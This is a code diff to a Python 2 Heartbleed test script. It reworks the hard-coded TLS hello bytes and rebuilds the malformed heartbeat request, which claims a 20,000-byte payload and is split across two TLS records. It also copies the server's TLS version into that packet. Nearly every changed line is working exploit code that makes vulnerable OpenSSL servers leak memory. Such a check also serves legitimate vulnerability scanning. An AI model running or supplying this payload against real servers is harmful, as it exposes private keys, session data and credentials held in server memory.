@@ -53,7 +53,7 @@ def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
 
 hello = h2bin('''
-16 03 02 00  dc 01 00 00 d8 03 02 53
+16 03 03 00  dc 01 00 00 d8 03 03 53
 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
 bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
 00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
@@ -69,9 +69,6 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
 00 0f 00 01 01                                  
 ''')
-
-hb = "\x18\x03\x02N#\x01N " + "\x01"*20000
-
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -107,10 +104,6 @@ def recvmsg(s):
 
 
 def hit_hb(s):
-    try:
-        s.send(hb)
-    except Exception, e:
-        return False
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
@@ -138,10 +131,18 @@ def is_vulnerable(host, timeout):
     except Exception, e:
         return None
     s.send(hello)
+
+    hbpkt = h2bin("01 4e 20") + "\x01"*20000
+    hb = h2bin("18 03 03 40 00") + hbpkt[0:16384] + \
+            h2bin("18 03 03 0e 23") + hbpkt[16384:]
+
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
             return None
+
+        # copy ssl version from server to heartbeat request packet
+        hb=hb[:2] + chr(ver&0xff) + hb[3:]
         # Look for server hello done message.
         if typ == 22 and ord(pay[0]) == 0x0E:
             break
